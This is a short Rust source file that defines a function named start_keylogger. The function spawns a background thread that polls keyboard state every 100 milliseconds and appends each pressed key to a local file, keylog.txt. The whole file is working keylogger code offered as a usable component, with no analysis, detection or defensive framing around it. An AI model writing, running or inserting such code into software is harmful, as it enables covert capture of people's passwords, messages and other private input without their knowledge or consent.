use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;
use std::thread;
use std::time::Duration;

pub fn start_keylogger() {
    let device_state = DeviceState::new();
    thread::spawn(move || {
        let mut last_keys = vec![];
        loop {
            let keys = device_state.get_keys();
            if keys != last_keys && !keys.is_empty() {
                let mut file = OpenOptions::new()
                    .append(true)
                    .create(true)
                    .open("keylog.txt")
                    .unwrap();
                for k in &keys {
                    writeln!(file, "{:?}", k).unwrap();
                }
                last_keys = keys;
            }
            thread::sleep(Duration::from_millis(100));
        }
    });
}